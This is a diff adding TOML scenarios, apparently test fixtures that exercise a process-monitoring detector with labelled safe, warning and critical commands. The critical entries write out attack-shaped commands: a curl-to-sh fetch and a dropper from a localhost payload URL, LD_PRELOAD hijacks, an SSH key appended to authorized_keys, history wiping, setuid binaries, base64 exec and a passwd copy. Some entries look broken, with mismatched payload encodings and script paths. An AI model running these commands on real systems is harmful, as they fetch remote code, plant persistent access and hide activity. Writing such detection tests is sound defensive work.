+container = "target"
+expected = 4
+at = 5129
+duration = 13
+params = { path = "/opt/vendor/bin/cronx", script = "sync.sh", secs = 5 }
+steps = [{ cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh .local/share/bin/{script}", timeout = 30 }]
+
+[[scenarios]]
+id = "busy_poll.e"
+family = "busy_poll"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5146
+duration = 15
+params = { n = 180 }
+steps = [{ cmd = "sh -c 'i=0; while [ $i -lt {n} ]; do i=$((i+1)); done'", timeout = 30 }]
+
+[[scenarios]]
+id = "pipe_spawn.e"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5165
+duration = 13
+params = { n = 73, secs = 6 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "dropper_stage.f"
+family = "dropper_stage"
+label = "crit"
+container = "target"
+expected = 4
+at = 5182
+duration = 13
+params = { secs = 3 }
+steps = [{ cmd = "curl -sf -o /var/lib/.d http://127.0.0.1/payload.sh && chmod +x /var/lib/.d && /var/lib/.d", timeout = 30 }]
+
+[[scenarios]]
+id = "deep_path_tool.c"
+family = "deep_path_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 5199
+duration = 10
+params = { dir = "/usr/local/share/q/r", name = "mapper", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "vendor_binary.d"
+family = "vendor_binary"
+label = "warn"
+container = "target"
+expected = 3
+at = 5213
+duration = 11
+params = { dir = "/opt/vendor/bin/bundled", secs = 5 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/cts-sync && {dir}/cts-sync {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "tree_walk.b"
+family = "tree_walk"
+label = "safe"
+container = "target"
+expected = 3
+at = 5228
+duration = 9
+params = { root = "/etc", secs = 3 }
+steps = [{ cmd = "find {root} -maxdepth 2 2>/dev/null | wc -l; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "fork_storm.f"
+family = "fork_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 61
+at = 5241
+duration = 9
+params = { n = 180, spin = 0.1, tail = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {spin} & i=$((i+1)); done; sleep {tail}; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "custom_daemon.d"
+family = "custom_daemon"
+label = "warn"
+container = "target"
+expected = 3
+at = 5254
+duration = 10
+params = { bin = "/opt/tools/gridd", secs = 8 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "proc_listing.b"
+family = "proc_listing"
+label = "safe"
+container = "target"
+expected = 3
+at = 5268
+duration = 9
+params = { n = 10, out = "/var/tmp/ps.txt", secs = 3 }
+steps = [{ cmd = "ps aux | head -{n} > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tree_walk.d"
+family = "tree_walk"
+label = "safe"
+container = "target"
+expected = 3
+at = 5281
+duration = 9
+params = { root = "/usr/lib", secs = 3 }
+steps = [{ cmd = "find {root} -maxdepth 2 2>/dev/null | wc -l; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "backup_job.e"
+family = "backup_job"
+label = "warn"
+container = "target"
+expected = 3
+at = 5294
+duration = 13
+params = { dir = "/srv/app/fetchd", secs = 6 }
+steps = [{ cmd = "mkdir -p {dir} && cp -r /etc/hostname /etc/os-release {dir}/ && sh -c 'sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "new_tool.e"
+family = "new_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 5311
+duration = 13
+params = { dir = "/home/dev/bin/unpack", name = "sentinel", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "home_script.e"
+family = "home_script"
+label = "warn"
+container = "target"
+expected = 4
+at = 5328
+duration = 13
+params = { path = "/usr/local/sbin/metad", script = "sync.sh", secs = 6 }
+steps = [{ cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh .local/share/bin/{script}", timeout = 30 }]
+
+[[scenarios]]
+id = "unexpected_parent.c"
+family = "unexpected_parent"
+label = "crit"
+container = "target"
+expected = 5
+at = 5345
+duration = 11
+params = { path = "/opt/scand" }
+steps = [{ cmd = "cp /usr/bin/python3 {path} && {path} -c \"import subprocess; subprocess.run(['sleep', '3'])\"", timeout = 30 }]
+
+[[scenarios]]
+id = "chmod_then_run.c"
+family = "chmod_then_run"
+label = "crit"
+container = "target"
+expected = 3
+at = 5360
+duration = 10
+params = { path = "/tmp/.rr", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod 4755 {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "log_rotate.f"
+family = "log_rotate"
+label = "safe"
+container = "target"
+expected = 3
+at = 5374
+duration = 10
+params = { dir = "/tmp/queuer", name = "worker", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "write_loop.g"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5388
+duration = 13
+params = { name = "dump.bin", mb = 37, secs = 7 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "custom_daemon.g"
+family = "custom_daemon"
+label = "warn"
+container = "target"
+expected = 3
+at = 5405
+duration = 10
+params = { bin = "/var/opt/pkg/fusion", secs = 3 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_timer.d"
+family = "cron_timer"
+label = "safe"
+container = "target"
+expected = 9
+at = 5419
+duration = 17
+params = { n = 9, job = 2, cadence = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {job} & i=$((i+1)); sleep {cadence}; done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "world_writable_exec.d"
+family = "world_writable_exec"
+label = "crit"
+container = "target"
+expected = 3
+at = 5440
+duration = 10
+params = { dir = "/var/tmp/.s", name = ".proc", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && chmod 777 {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "dd_pipe_burn.a"
+family = "dd_pipe_burn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5454
+duration = 12
+params = { secs = 6 }
+steps = [{ cmd = "timeout {secs} sh -c 'dd if=/dev/zero bs=1M 2>/dev/null | cat > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "report_job.d"
+family = "report_job"
+label = "safe"
+container = "target"
+expected = 3
+at = 5470
+duration = 10
+params = { out = "/root/unpack", secs = 3 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "source_checkout.f"
+family = "source_checkout"
+label = "safe"
+container = "target"
+expected = 3
+at = 5484
+duration = 10
+params = { dir = "/srv/app/sync2", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_filler.e"
+family = "disk_filler"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5498
+duration = 15
+params = { n = 6 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do dd if=/dev/zero of=/scratch/blob.$i bs=1M count=6 2>/dev/null; sleep 1.2; i=$((i+1)); done; rm -f /scratch/blob.*", timeout = 30 }]
+
+[[scenarios]]
+id = "home_script.f"
+family = "home_script"
+label = "warn"
+container = "target"
+expected = 4
+at = 5517
+duration = 13
+params = { path = "/root/.local/bundled", script = "deploy.sh", secs = 8 }
+steps = [{ cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh .local/bin/{script}", timeout = 30 }]
+
+[[scenarios]]
+id = "hosts_edit.b"
+family = "hosts_edit"
+label = "crit"
+container = "target"
+expected = 3
+at = 5534
+duration = 9
+params = { host = "api.example.test", secs = 3 }
+steps = [{ cmd = "echo '127.0.0.1 {host}' >> /etc/hosts; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "ld_preload_hijack.e"
+family = "ld_preload_hijack"
+label = "crit"
+container = "target"
+expected = 2
+at = 5547
+duration = 11
+params = { secs = 3 }
+steps = [{ cmd = "LD_LIBRARY_PATH=/dev/shm/.l LD_PRELOAD=/dev/shm/.l/libc-hook.so sleep {secs} 2>/dev/null", timeout = 30 }]
+
+[[scenarios]]
+id = "deep_path_tool.b"
+family = "deep_path_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 5562
+duration = 10
+params = { dir = "/srv/x/y/z", name = "walker", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "new_tool.f"
+family = "new_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 5576
+duration = 13
+params = { dir = "/usr/local/bin", name = "forge", secs = 5 }
+steps = [{ cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "inline_encoded.e"
+family = "inline_encoded"
+label = "crit"
+container = "target"
+expected = 2
+at = 5593
+duration = 9
+params = { payload = "aW1wb3J0IHRpbWU7dGltZS5zbGVlcCgzKQ==" }
+steps = [{ cmd = "python3 -c \"import zlib, base64; exec(zlib.decompress(base64.b64decode('{payload}')))\"", timeout = 20 }]
+
+[[scenarios]]
+id = "svc_status.e"
+family = "svc_status"
+label = "safe"
+container = "target"
+expected = 3
+at = 5606
+duration = 9
+params = { secs = 4 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.g"
+family = "file_sync"
+label = "safe"
+container = "target"
+expected = 3
+at = 5619
+duration = 10
+params = { dst = "/srv/gridd", secs = 4 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "masquerade.e"
+family = "masquerade"
+label = "crit"
+container = "target"
+expected = 3
+at = 5633
+duration = 10
+params = { path = "/srv/bin/pushd", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tight_python_spin.c"
+family = "tight_python_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5647
+duration = 12
+params = { secs = 5 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); [None for _ in iter(lambda: time.time() - t < {secs}, False)]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.f"
+family = "file_sync"
+label = "safe"
+container = "target"
+expected = 3
+at = 5663
+duration = 10
+params = { dst = "/srv/mirrord", secs = 4 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "agent_swarm.d"
+family = "agent_swarm"
+label = "safe"
+container = "target"
+expected = 21
+at = 5677
+duration = 9
+params = { n = 9, work = 0.37, tail = 2 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {work} & i=$((i+1)); done; sleep {tail}; wait", timeout = 20 }]
+
+[[scenarios]]
+id = "history_wipe.f"
+family = "history_wipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 5690
+duration = 9
+params = { secs = 5 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "hotfix_script.d"
+family = "hotfix_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 5703
+duration = 11
+params = { secs = 7 }
+steps = [{ cmd = "mkdir -p /root/fix && printf 'import time\\ntime.sleep({secs})\\n' > /root/fix/patch.py && python3 /root/fix/patch.py", timeout = 30 }]
+
+[[scenarios]]
+id = "tool_upgrade.e"
+family = "tool_upgrade"
+label = "warn"
+container = "target"
+expected = 3
+at = 5718
+duration = 10
+params = { bin = "/opt/tools/cronx", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "curl_flood.e"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5732
+duration = 13
+params = { n = 167 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "fd_leak.c"
+family = "fd_leak"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5749
+duration = 11
+params = { n = 180 }
+steps = [{ cmd = "python3 -c \"import os, time; ps = [os.pipe() for _ in range({n})]; time.sleep(4)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "world_writable_exec.a"
+family = "world_writable_exec"
+label = "crit"
+container = "target"
+expected = 3
+at = 5764
+duration = 10
+params = { dir = "/tmp/.w", name = ".run", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && chmod 777 {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "thread_burst.d"
+family = "thread_burst"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5778
+duration = 13
+params = { n = 125 }
+steps = [{ cmd = "python3 -c \"import threading, time; [threading.Thread(target=time.sleep, args=(4,)).start() for _ in range({n})]; time.sleep(5)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "hosts_edit.c"
+family = "hosts_edit"
+label = "crit"
+container = "target"
+expected = 3
+at = 5795
+duration = 9
+params = { host = "mirror.example.test", secs = 2 }
+steps = [{ cmd = "echo '127.0.0.1 {host}' >> /etc/hosts; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tmpfs_copy.h"
+family = "tmpfs_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 5808
+duration = 13
+params = { path = "/usr/local/sbin/.tickd", secs = 1 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod +x {path} && {path} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "compress_big.d"
+family = "compress_big"
+label = "warn"
+container = "target"
+expected = 3
+at = 5825
+duration = 10
+params = { out = "/root/peerd", secs = 4 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "backup_job.c"
+family = "backup_job"
+label = "warn"
+container = "target"
+expected = 3
+at = 5839
+duration = 13
+params = { dir = "/mnt/metad", secs = 5 }
+steps = [{ cmd = "mkdir -p {dir} && cp -r /etc/hostname /etc/os-release {dir}/ && sh -c 'sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "build_fanout.f"
+family = "build_fanout"
+label = "safe"
+container = "target"
+expected = 9
+at = 5856
+duration = 13
+params = { n = 24, secs = 2 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {secs} & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "sort_count.d"
+family = "sort_count"
+label = "safe"
+container = "target"
+expected = 3
+at = 5873
+duration = 9
+params = { out = "/srv/c.txt", secs = 3 }
+steps = [{ cmd = "printf 'b\\na\\nb\\n' | sort | uniq -c > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "seq_sort_spin.b"
+family = "seq_sort_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5886
+duration = 12
+params = { n = 3000000 }
+steps = [{ cmd = "seq 1 {n} | sort -R | tail -1 > /dev/null; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "seq_sort_spin.a"
+family = "seq_sort_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 5902
+duration = 12
+params = { n = 2000000 }
+steps = [{ cmd = "seq 1 {n} | sort -R | tail -1 > /dev/null; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "cpu_spin.g"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5918
+duration = 17
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 30 }]
+
+[[scenarios]]
+id = "cpu_spin.e"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 5939
+duration = 17
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 30 }]
+
+[[scenarios]]
+id = "respawn_loop.d"
+family = "respawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 51
+at = 5960
+duration = 17
+params = { n = 25 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep 0.4'; i=$((i+1)); done", timeout = 32 }]
+
+[[scenarios]]
+id = "ld_preload_hijack.f"
+family = "ld_preload_hijack"
+label = "crit"
+container = "target"
+expected = 2
+at = 5981
+duration = 11
+params = { secs = 3 }
+steps = [{ cmd = "LD_LIBRARY_PATH=/dev/shm/.l LD_PRELOAD=/dev/shm/.l/libc-hook.so sleep {secs} 2>/dev/null", timeout = 30 }]
+
+[[scenarios]]
+id = "remote_script.g"
+family = "remote_script"
+label = "crit"
+container = "target"
+expected = 3
+at = 5996
+duration = 10
+params = { secs = 2 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "sort_count.c"
+family = "sort_count"
+label = "safe"
+container = "target"
+expected = 3
+at = 6010
+duration = 9
+params = { out = "/root/c.txt", secs = 2 }
+steps = [{ cmd = "printf 'b\\na\\nb\\n' | sort | uniq -c > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "custom_daemon.f"
+family = "custom_daemon"
+label = "warn"
+container = "target"
+expected = 3
+at = 6023
+duration = 10
+params = { bin = "/srv/bin/mover", secs = 7 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "deep_path_tool.d"
+family = "deep_path_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 6037
+duration = 10
+params = { dir = "/var/opt/m/n/o", name = "gaugeit", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "svc_status.g"
+family = "svc_status"
+label = "safe"
+container = "target"
+expected = 3
+at = 6051
+duration = 9
+params = { secs = 4 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "mem_grower.e"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 6064
+duration = 16
+params = { n = 14, gap = 0.5 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 35 }]
+
+[[scenarios]]
+id = "masquerade.f"
+family = "masquerade"
+label = "crit"
+container = "target"
+expected = 3
+at = 6084
+duration = 10
+params = { path = "/opt/vendor/bin/metad", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tar_pack.a"
+family = "tar_pack"
+label = "safe"
+container = "target"
+expected = 3
+at = 6098
+duration = 9
+params = { out = "/tmp/pack.tgz", secs = 2 }
+steps = [{ cmd = "tar czf {out} /etc/hostname /etc/os-release 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.g"
+family = "python_tool"
+label = "safe"
+container = "target"
+expected = 3
+at = 6111
+duration = 9
+params = { code = "import platform; print(platform.machine())", secs = 4 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "pkg_install.f"
+family = "pkg_install"
+label = "safe"
+container = "target"
+expected = 6
+at = 6124
+duration = 15
+params = { n = 4, secs = 7 }
+steps = [{ cmd = "sleep 3; i=0; while [ $i -lt {n} ]; do cp /bin/sleep /tmp/pkgd.$i; i=$((i+1)); done; /tmp/pkgd.0 {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "inline_encoded.f"
+family = "inline_encoded"
+label = "crit"
+container = "target"
+expected = 2
+at = 6143
+duration = 9
+params = { payload = "eNrLzC3ILypRKMnMTbUGEXrFOampBRpGmgB+wwkf" }
+steps = [{ cmd = "python3 -c \"import base64; exec(base64.b64decode('{payload}'))\"", timeout = 20 }]
+
+[[scenarios]]
+id = "shadow_copy.c"
+family = "shadow_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 6156
+duration = 11
+params = { secs = 7 }
+steps = [{ cmd = "cp /etc/passwd /tmp/.p && cp /usr/bin/sleep /usr/local/lib/.s && /usr/local/lib/.s {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "build_fanout.g"
+family = "build_fanout"
+label = "safe"
+container = "target"
+expected = 9
+at = 6171
+duration = 13
+params = { n = 3, secs = 2 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/sleep /tmp/cc.$i && /tmp/cc.$i {secs}; i=$((i+1)); done", timeout = 30 }]
+
+[[scenarios]]
+id = "editor_plugin.d"
+family = "editor_plugin"
+label = "warn"
+container = "target"
+expected = 3
+at = 6188
+duration = 11
+params = { dir = "/root/.vscode/extensions/cronx", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/helper && {dir}/helper {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "agent_swarm.e"
+family = "agent_swarm"
+label = "safe"
+container = "target"
+expected = 21
+at = 6203
+duration = 9
+params = { n = 27, work = 0.1, tail = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {work} & i=$((i+1)); done; sleep {tail}; wait", timeout = 20 }]
+
+[[scenarios]]
+id = "proc_listing.a"
+family = "proc_listing"
+label = "safe"
+container = "target"
+expected = 3
+at = 6216
+duration = 9
+params = { n = 5, out = "/tmp/ps.txt", secs = 2 }
+steps = [{ cmd = "ps aux | head -{n} > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "ld_preload_hijack.c"
+family = "ld_preload_hijack"
+label = "crit"
+container = "target"
+expected = 2
+at = 6229
+duration = 11
+params = { secs = 6 }
+steps = [{ cmd = "LD_PRELOAD=/tmp/.libx.so sleep {secs} 2>/dev/null", timeout = 30 }]
+
+[[scenarios]]
+id = "chmod_then_run.d"
+family = "chmod_then_run"
+label = "crit"
+container = "target"
+expected = 3
+at = 6244
+duration = 10
+params = { path = "/var/tmp/.ss", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod 4755 {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "hotfix_script.e"
+family = "hotfix_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 6258
+duration = 11
+params = { secs = 5 }
+steps = [{ cmd = "mkdir -p /root/fix && printf 'import time\\ntime.sleep({secs})\\n' > /root/fix/patch.py && python3 /root/fix/patch.py", timeout = 30 }]
+
+[[scenarios]]
+id = "shadow_copy.f"
+family = "shadow_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 6273
+duration = 11
+params = { secs = 5 }
+steps = [{ cmd = "cp /etc/passwd /tmp/.p && cp /usr/bin/sleep /usr/local/lib/.s && /usr/local/lib/.s {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "pkg_install.e"
+family = "pkg_install"
+label = "safe"
+container = "target"
+expected = 6
+at = 6288
+duration = 15
+params = { n = 2, unpack = 2, configure = 2 }
+steps = [{ cmd = "sleep {unpack}; i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/pkg.$i; i=$((i+1)); done; sleep {configure}", timeout = 30 }]
+
+[[scenarios]]
+id = "wide_spawn_loop.d"
+family = "wide_spawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6307
+duration = 12
+params = { n = 70, gap = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep {gap}' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "agent_swarm.c"
+family = "agent_swarm"
+label = "safe"
+container = "target"
+expected = 21
+at = 6323
+duration = 9
+params = { n = 28, work = 0.1, tail = 1 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {work} & i=$((i+1)); done; sleep {tail}; wait", timeout = 20 }]
+
+[[scenarios]]
+id = "unexpected_parent.e"
+family = "unexpected_parent"
+label = "crit"
+container = "target"
+expected = 5
+at = 6336
+duration = 11
+params = { path = "/opt/scand" }
+steps = [{ cmd = "cp /usr/bin/python3 {path} && {path} -c \"import subprocess; subprocess.run(['sleep', '3'])\"", timeout = 30 }]
+
+[[scenarios]]
+id = "miner_like.e"
+family = "miner_like"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 6351
+duration = 15
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & wait", timeout = 30 }]
+
+[[scenarios]]
+id = "bind_shell.f"
+family = "bind_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 6370
+duration = 10
+params = { port = 400, secs = 1 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "odd_timestamp.c"
+family = "odd_timestamp"
+label = "warn"
+container = "target"
+expected = 3
+at = 6384
+duration = 9
+params = { n = 3, path = "/root/stamp", secs = 2 }
+steps = [{ cmd = "touch -d '2020-01-0{n} 03:00' {path}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "sort_count.b"
+family = "sort_count"
+label = "safe"
+container = "target"
+expected = 3
+at = 6397
+duration = 9
+params = { out = "/var/tmp/c.txt", secs = 3 }
+steps = [{ cmd = "printf 'b\\na\\nb\\n' | sort | uniq -c > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tar_pack.b"
+family = "tar_pack"
+label = "safe"
+container = "target"
+expected = 3
+at = 6410
+duration = 9
+params = { out = "/var/tmp/etc.tgz", secs = 3 }
+steps = [{ cmd = "tar czf {out} /etc/hostname /etc/os-release 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.f"
+family = "admin_scan"
+label = "warn"
+container = "target"
+expected = 3
+at = 6423
+duration = 10
+params = { pat = "*.d", secs = 3 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "proc_listing.d"
+family = "proc_listing"
+label = "safe"
+container = "target"
+expected = 3
+at = 6437
+duration = 9
+params = { n = 8, out = "/srv/ps.txt", secs = 3 }
+steps = [{ cmd = "ps aux | head -{n} > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "port_scan.e"
+family = "port_scan"
+label = "crit"
+container = "target"
+expected = 2
+at = 6450
+duration = 13
+params = { secs = 6 }
+steps = [{ cmd = "python3 -c \"import socket, time; [socket.socket().connect_ex(('127.0.0.1', p)) for p in range(1, 1200)]; time.sleep({secs})\"", timeout = 30 }]
+
+[[scenarios]]
+id = "ssh_key_drop.g"
+family = "ssh_key_drop"
+label = "crit"
+container = "target"
+expected = 3
+at = 6467
+duration = 10
+params = { key = "C3Nza", secs = 3 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
